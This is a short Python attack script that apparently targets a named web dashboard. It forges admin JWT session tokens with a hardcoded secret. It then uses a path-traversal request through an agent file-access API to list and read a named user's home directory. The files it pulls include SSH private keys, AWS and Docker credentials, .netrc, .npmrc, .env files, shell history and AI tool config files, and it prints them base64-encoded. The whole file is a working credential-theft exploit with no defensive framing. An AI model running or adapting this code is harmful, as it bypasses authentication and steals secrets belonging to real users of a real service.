#!/usr/bin/env python3
# i29311 phase4: harvest Brian's /home/coder via local branch
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up
HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout); return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", repr(e)
def curl(args, timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def tok_for(uid,cust): return forge({"userId":uid,"email":"probe@x","customer":cust,"role":"admin"})
def call(path,cookie,timeout=30,maxlen=200000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-H","Cookie: session="+cookie,"-w","\n__CODE__%{http_code}","https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
K="/home/lumii/.lumii-agent-keeper/.."
def rd(aid,rel,tok,maxlen=30000): return call("/api/agents/%s/files?action=read&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)
def ls(aid,rel,tok,maxlen=30000): return call("/api/agents/%s/files?action=list&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)

AID="agent-047f1d22"; CUST="aro"; AUID="fc7c3730-4219-11f1-ac43-525400595be1"
def main():
    TOK = tok_for(AUID, CUST)
    for d in ["/","/.ssh","/.aws","/.config","/.gnupg","/.claude","/.gstack","/.codex-sessions","/.docker","/.lumii","/.kube","/.npm","/.local","/Library","/.lumii-agent-keeper/attachments","/.lumii-agent-keeper/crons","/.npm-global"]:
        R("LS"+d.replace("/","_"), ls(AID,d,TOK,maxlen=6000))
    for f in ["/.bash_history","/.gitconfig","/.netrc","/.npmrc","/.ssh/config","/.ssh/known_hosts","/.ssh/id_rsa","/.ssh/id_ed25519","/.aws/credentials","/.docker/config.json","/.decart.env","/.env",".env.local","/.env.prod","/.claude.json","/.wget-hsts"]:
        R("RD"+f.replace("/","_"), rd(AID,f,TOK,maxlen=12000))
try: main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally: sys.exit(0)
